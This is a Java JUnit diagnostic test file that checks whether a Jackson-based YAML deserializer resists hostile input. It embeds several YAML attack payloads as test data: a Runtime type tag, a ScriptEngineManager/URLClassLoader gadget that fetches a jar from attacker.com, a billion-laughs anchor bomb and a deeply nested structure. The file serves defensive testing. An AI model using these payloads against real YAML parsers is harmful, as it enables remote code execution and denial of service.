package org.peakaboo.framework.druthers;

import org.junit.Test;
import org.peakaboo.framework.druthers.serialize.DruthersJacksonBackend;
import org.peakaboo.framework.druthers.serialize.DruthersSerializerBackend;

/**
 * Diagnostic test to understand Jackson YAML security behavior.
 * <p>
 * Jackson has a fundamentally different security model than SnakeYAML:
 * <ul>
 *   <li>Jackson IGNORES YAML type tags (!!java.*, !!javax.*, etc.) by default</li>
 *   <li>Jackson uses its own type system via annotations (@JsonTypeInfo, etc.)</li>
 *   <li>Default typing is disabled in DruthersJacksonBackend, preventing polymorphic attacks</li>
 * </ul>
 */
public class JacksonSecurityDiagnosticTest {

	@Test
	public void diagnoseRuntimeTag() {
		DruthersSerializerBackend backend = new DruthersJacksonBackend();

		String yaml = """
			!!java.lang.Runtime
			name: malicious
			""";

		System.out.println("=== Testing Jackson with !!java.lang.Runtime ===" );
		try {
			Object result = backend.deserialize(yaml, true, null, Object.class);
			System.out.println("✅ Jackson parsed without error (EXPECTED)");
			System.out.println("Result type: " + (result != null ? result.getClass().getName() : "null"));
			System.out.println("Result value: " + result);
			System.out.println("Is it actually Runtime? " + (result instanceof Runtime));
			System.out.println("");
			System.out.println("🔍 ANALYSIS:");
			System.out.println("Jackson ignores !! type tags and creates a generic Map/List structure.");
			System.out.println("This is SAFE because it doesn't instantiate the tagged class.");
		} catch (Exception e) {
			System.out.println("❌ Exception thrown: " + e.getClass().getName());
			System.out.println("Message: " + e.getMessage());
		}
	}

	@Test
	public void diagnoseScriptEngineTag() {
		DruthersSerializerBackend backend = new DruthersJacksonBackend();

		String yaml = """
			!!javax.script.ScriptEngineManager [
			  !!java.net.URLClassLoader [[
			    !!java.net.URL ["http://attacker.com/malicious.jar"]
			  ]]
			]
			""";

		System.out.println("\n=== Testing Jackson with !!javax.script.ScriptEngineManager ===" );
		try {
			Object result = backend.deserialize(yaml, true, null, Object.class);
			System.out.println("✅ Jackson parsed without error (EXPECTED)");
			System.out.println("Result type: " + (result != null ? result.getClass().getName() : "null"));
			System.out.println("Result value: " + result);
			System.out.println("Is it actually ScriptEngineManager? " + (result instanceof javax.script.ScriptEngineManager));
			System.out.println("");
			System.out.println("🔍 ANALYSIS:");
			System.out.println("Jackson treats this as a nested list structure, not actual Java objects.");
		} catch (Exception e) {
			System.out.println("❌ Exception thrown: " + e.getClass().getName());
			System.out.println("Message: " + e.getMessage());
		}
	}

	@Test
	public void diagnoseBillionLaughs() {
		DruthersSerializerBackend backend = new DruthersJacksonBackend();

		String yaml = """
			a0: &a0 ["x"]
			a1: &a1 [*a0, *a0, *a0, *a0, *a0]
			a2: &a2 [*a1, *a1, *a1, *a1, *a1]
			a3: &a3 [*a2, *a2, *a2, *a2, *a2]
			a4: &a4 [*a3, *a3, *a3, *a3, *a3]
			a5: &a5 [*a4, *a4, *a4, *a4, *a4]
			a6: &a6 [*a5, *a5, *a5, *a5, *a5]
			a7: &a7 [*a6, *a6, *a6, *a6, *a6]
			a8: &a8 [*a7, *a7, *a7, *a7, *a7]
			a9: &a9 [*a8, *a8, *a8, *a8, *a8]
			a10: &a10 [*a9, *a9, *a9, *a9, *a9]
			a11: &a11 [*a10, *a10, *a10, *a10, *a10]
			root: *a11
			""";

		System.out.println("\n=== Testing Jackson Billion Laughs Attack ===" );
		System.out.println("Expected: Exponential memory expansion");
		System.out.println("12 unique anchors with 5x expansion each level");
		System.out.println("");

		try {
			Object result = backend.deserialize(yaml, true, null, Object.class);
			System.out.println("⚠️  Jackson parsed without error");
			System.out.println("Result type: " + (result != null ? result.getClass().getName() : "null"));
			System.out.println("");
			System.out.println("🔍 ANALYSIS:");
			System.out.println("Jackson may need StreamReadConstraints to limit anchor expansion.");
		} catch (Exception e) {
			System.out.println("✅ SECURE: Exception thrown");
			System.out.println("Exception type: " + e.getClass().getName());
			System.out.println("Exception message: " + e.getMessage());
		}
	}

	@Test
	public void diagnoseDeepNesting() {
		DruthersSerializerBackend backend = new DruthersJacksonBackend();

		// Generate 100-level deep nested structure
		StringBuilder deepNesting = new StringBuilder();
		for (int i = 0; i < 100; i++) {
			deepNesting.append("level").append(i).append(": {");
		}
		deepNesting.append("value: deep");
		for (int i = 0; i < 100; i++) {
			deepNesting.append("}");
		}

		String maliciousYaml = deepNesting.toString();

		System.out.println("\n=== Testing Jackson Deep Nesting Attack ===" );
		System.out.println("Generated 100 levels of nesting");
		System.out.println("");

		try {
			Object result = backend.deserialize(maliciousYaml, true, null, Object.class);
			System.out.println("⚠️  Jackson parsed without error");
			System.out.println("Result type: " + (result != null ? result.getClass().getName() : "null"));
			System.out.println("");
			System.out.println("🔍 ANALYSIS:");
			System.out.println("Jackson may need StreamReadConstraints.maxNestingDepth configured.");
		} catch (Exception e) {
			System.out.println("✅ SECURE: Exception thrown");
			System.out.println("Exception type: " + e.getClass().getName());
			System.out.println("Exception message: " + e.getMessage());
		}
	}

}
